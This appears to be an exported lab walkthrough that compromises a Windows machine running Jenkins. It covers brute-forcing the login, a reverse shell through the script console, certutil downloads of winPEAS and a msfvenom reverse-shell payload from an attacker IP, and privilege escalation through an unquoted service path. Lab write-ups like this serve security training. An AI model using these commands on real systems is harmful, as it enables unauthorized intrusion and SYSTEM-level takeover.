<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Exploiting</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
    margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="e514c767-74fe-46d8-81c2-0a8215da6e32" class="page sans"><header><h1 class="page-title">Exploiting</h1><p class="page-description"></p></header><div class="page-body"><p id="69767775-dd29-4fdd-b56f-c4cc4010e298" class="">
</p><p id="e43980d3-67ed-4017-83af-8495047544ba" class="">
</p><p id="0491f2d8-6e93-461e-9042-7858e79b9f35" class="">Now I will be using burpsuite to crack this password: </p><p id="b4fc97fc-456b-42a8-9bff-bd81ee88587c" class="">
</p><figure id="f2107dc1-521e-4042-98e4-106e37c21f6c" class="image"><a href="Exploiting%20e514c76774fe46d881c20a8215da6e32/Untitled.png"><img style="width:1279px" src="Exploiting%20e514c76774fe46d881c20a8215da6e32/Untitled.png"/></a></figure><p id="63b662e6-fd43-445c-a01b-6398cb4a241b" class="">
</p><p id="0b37b0f4-f896-4b28-a515-df73edea2540" class="">The attack type is going to be cluster bomb , what cluster bomb does is it tries every single username with every single password.</p><p id="448885bb-df0e-4d58-b7cf-0112423607df" class="">Now we are going repeat the process like we did in “<strong><strong>Credential Stuffing and Password Spraying</strong></strong>”  </p><p id="78ca7c05-410d-4103-8cdd-9a9b4772a0e5" class="">( Refer that page if needed )</p><p id="a676d7af-b31d-4f9f-8d24-3acff70d8415" class="">
</p><p id="66727b0e-89bd-46f2-b3dd-a6477ab5d27b" class="">After Cracking it we found that the username is jenkins and password is jenkins.</p><p id="c5942b90-925f-47a8-839d-9206735b1516" class="">
</p><p id="93e30acd-80d7-40a0-afbb-41eab20d03c8" class="">After logging into jenkins we need to go script and paste a reverse shell .<div class="indented"><p id="d447c40d-4971-47dc-9163-cec0d0ac94d7" class="">To find reverse shell we need to goto google and search for “jenkins reverse shell” (  Link: <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76</a> )</p></div></p><p id="c2151320-ad53-4b38-acdc-6d82f08bb0f2" class="">
</p><p id="49140cce-aaa5-49ed-be0a-bb4ed0d3b2e2" class="">
</p><p id="cf624f6b-3afb-49f3-a853-e94c8ffcceb8" class="">Paste that in the code in the script part of jenkins website and before running it we need to start a listener in your attacker machine. </p><p id="e35b2ae8-f5ca-4c33-bf25-03f91ed22c7e" class="">Once we when we get a reverse shell then we need to navigate into “c:\Users\butler” then </p><p id="67d48b39-9ee8-4017-a559-18f09fc4a650" class="">we need to use WinPeas for escalating privilege . To download winpeas : <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a></p><p id="13424f2e-2548-422e-8972-26fd2d0fd417" class="">
</p><p id="1b664c9a-9996-46ac-9565-c6c7227082b8" class="">Once the “exe” is downloaded we need to copy to folder in which we are going to host a python server.</p><p id="c83f7ef7-b58f-4014-9a7e-262803c072bb" class="">so to copy that winpeas to the victim machine we need to start a python server “python3 -m http.server 4545” </p><p id="7e3cbcca-8769-4bf0-a967-6fd2b95ed327" class="">
</p><figure id="d1f1e644-ba31-49cc-b3aa-b032fbcbff5b" class="image"><a href="Exploiting%20e514c76774fe46d881c20a8215da6e32/Untitled%201.png"><img style="width:1528px" src="Exploiting%20e514c76774fe46d881c20a8215da6e32/Untitled%201.png"/></a></figure><p id="79303d24-c8e6-4948-92db-c1bd6b985e0f" class="">
</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4e3f15db-2301-4a76-a0c7-fa2b4e6b074e" class="code"><code class="language-Bash">This is the command:

certutil -urlcache -f http://192.168.124.129:4545/winPEASx64.exe winpe.exe</code></pre><p id="67486c33-1251-44d2-8906-d070e8cad5e2" class="">
</p><p id="4a3ac922-6fc2-42c9-ac5f-731f2a6c969f" class="">
</p><p id="403b919a-ae5a-4fb3-bcae-c34fccf24500" class="">Once Winpeas is downloaded it in the victim machine. We need to run it.</p><p id="20e5b985-635a-48a5-9d11-236ee0a13722" class="">Then a big script will run. ( I will show you necessary part of the script for this exploitation )</p><p id="395bcf76-a836-4ad3-925c-9a16259b1da4" class="">
</p><figure id="55b638df-212d-47dd-ac03-718b976aac1a" class="image"><a href="Exploiting%20e514c76774fe46d881c20a8215da6e32/Untitled%202.png"><img style="width:1068px" src="Exploiting%20e514c76774fe46d881c20a8215da6e32/Untitled%202.png"/></a></figure><p id="67b9c549-9573-4b81-910f-3252a6086ca1" class="">
</p><figure id="2c95d0f6-fe29-4d1f-a92a-a513dad2b35d" class="image"><a href="Exploiting%20e514c76774fe46d881c20a8215da6e32/Untitled%203.png"><img style="width:1838px" src="Exploiting%20e514c76774fe46d881c20a8215da6e32/Untitled%203.png"/></a></figure><p id="cae1a7c4-4db5-4fea-980d-80bc97c81e53" class="">This is the zoomed part of the above image.</p><p id="5fed353a-6027-41ad-8ba5-1ce797e5045f" class="">
</p><h3 id="d653fad2-95c2-43a4-b76b-52c4cff9d0fc" class="">“No quotes and Space detected” aka “Unquoted Service Path”</h3><p id="463abb20-e043-489f-b518-253516ada27e" class="">
</p><p id="d670fe3a-ef86-4702-8d73-cfa009daa39b" class="">In simple terms, when a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is). In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument.</p><p id="8881a9c8-8575-4527-9018-b8176ae0a5f4" class="">
</p><p id="276fb809-0523-479b-988c-c372a00665ad" class="">
</p><p id="bc387c5f-58a2-41b4-84b7-4a887d19ed03" class="">Now lets look in the windows machine how it looks : ( )</p><figure id="28e8a41e-1ad0-4de1-af2c-c1deaab23bfa" class="image"><a href="Exploiting%20e514c76774fe46d881c20a8215da6e32/Untitled%204.png"><img style="width:1248px" src="Exploiting%20e514c76774fe46d881c20a8215da6e32/Untitled%204.png"/></a></figure><p id="dbfed3d5-f86d-4c71-923a-3222f96bbcc5" class="">
</p><p id="d7f82679-3f74-4e03-abe9-100c5e7004e8" class="">There should be quotes around it to prevent this attack from happening.</p><p id="d6efbcb6-2d2f-407b-9794-9e72ed8d24ca" class="">
</p><figure id="1e7d5329-2d9d-4c09-a0c2-4b7d129c9a8d" class="image"><a href="Exploiting%20e514c76774fe46d881c20a8215da6e32/Untitled%205.png"><img style="width:1242px" src="Exploiting%20e514c76774fe46d881c20a8215da6e32/Untitled%205.png"/></a></figure><p id="cae330f4-f8d8-4ed6-8859-c0634514d61e" class="">
</p><p id="56417b4b-f70f-4490-81c8-a2bcb86aa5c8" class="">It should be like this to prevent this attack from happening.</p><p id="e35425f4-f50f-4f64-9252-de606b192f36" class="">
</p><p id="f54e0f52-aaa4-495c-b155-2eb14a14421b" class="">Now what we are going to do is we are going to exploit this by pasting the malware in the “wise” folder .</p><p id="622044ff-8827-46ec-b2ed-c95b1bd32e61" class="">
</p><p id="909cb36b-f3e2-4a63-863e-fab55f8a820d" class="">To generate malware we are going to use “msfvenom”.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="40c5a01c-0d76-464f-a82e-ac3fee74a503" class="code"><code class="language-Bash">Command explanation:
msfvenom -p(payload) windows/x64/shell_reverse_tcp LHOST=192.168.124.129 LPORT=5555 -f(file type) exe &gt; Wise.exe

Command:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.124.129 LPORT=5555 -f exe &gt; Wise.exe</code></pre><p id="9e720420-1e3a-4e18-98b5-541631f8fdd2" class="">
</p><p id="e5cf5a77-999f-429d-8b55-18cfcf9b96a9" class="">
</p><p id="e9ee5124-cec9-4f50-81a9-0341cf867819" class="">After generating payload we need to copy it into our python server directory to transfer it into the victim machine to execute it. </p><p id="d32a239d-e131-4048-a677-80232c717ee7" class="">
</p><p id="cd681d87-3e3e-4ce0-94c0-8dc62d3dce99" class="">Now we are going to use the same command which is :</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="eb8196ab-5828-48b2-9761-5a2c361f9486" class="code"><code class="language-Bash">certutil -urlcache -f http://192.168.124.129/Wise.exe wise.exe</code></pre><p id="73a61605-df8d-46b9-bb84-5f2151853688" class="">
</p><p id="b98623ab-c18f-48d6-9ddf-34c333c26b48" class="">Now once file is downloaded in the folder :  “C:\Program Files (x86)\Wise”</p><p id="19c77ea5-401b-463a-a5fe-15070e0e734d" class="">
</p><p id="1edfc18f-ea3b-4be0-8f7b-e07591b0f9c3" class="">Now we need to execute it. But we shouldn’t run it directly. Because it is going to run this is as regular user its gonna run it as butler.</p><p id="5f2ada42-8c3c-4a58-b669-27ec0a699afb" class="">
</p><p id="ba064529-aa7c-4e1a-a337-ababb3b2bdd8" class="">What we need to do is we need to stop the service that is running . The service that is running is “Wise boot assistant” refer from winpeas images ( Look at the name ).</p><p id="94e2b185-7898-42f6-8188-2bff75f05192" class="">
</p><figure id="20744a26-a192-4a69-b696-101420264491" class="image"><a href="Exploiting%20e514c76774fe46d881c20a8215da6e32/Untitled%206.png"><img style="width:1255px" src="Exploiting%20e514c76774fe46d881c20a8215da6e32/Untitled%206.png"/></a></figure><p id="f1519847-296a-4e03-82c6-5cbbfee22454" class="">
</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a4eb326-c488-44e9-88e8-c95e31da494e" class="code"><code class="language-Bash">Commands: 
	
	sc stop WiseBootAssistant
	sc query WiseBootAssistant</code></pre><p id="5138bccc-1794-4613-828b-d2cc1f9b948f" class="">
</p><p id="9e7a2431-6d57-47c8-b7a6-a044149f3c8c" class="">Once we stopped it we need to start a listener on the port we mentioned in the msfvenom , Then we need to start the service.</p><p id="d4428b3a-c224-49cc-a8fe-1874d619ee11" class="">
</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="367feba3-65d6-4e76-91c1-77603b0b8d4f" class="code"><code class="language-Bash">To start service :
	
	sc start WiseBootAssistant</code></pre><p id="369550e7-eebb-4765-b84f-6041a1560a94" class="">
</p><p id="1b685303-8b0f-435d-9809-9955b027cb3c" class="">
</p><p id="332c0af3-1fa2-4ab9-9847-a02ee73325d8" class="">
</p><p id="59fa0a1e-9932-4aaa-a2fb-cdc0530f1ebc" class="">After starting the service we can see we got a reverse connection as Administrator.</p><figure id="5d7be775-e643-4355-b481-88bca6798baa" class="image"><a href="Exploiting%20e514c76774fe46d881c20a8215da6e32/Untitled%207.png"><img style="width:960px" src="Exploiting%20e514c76774fe46d881c20a8215da6e32/Untitled%207.png"/></a></figure><p id="84791e3b-86f7-4fa6-a1c0-55ff923ab3db" class="">
</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>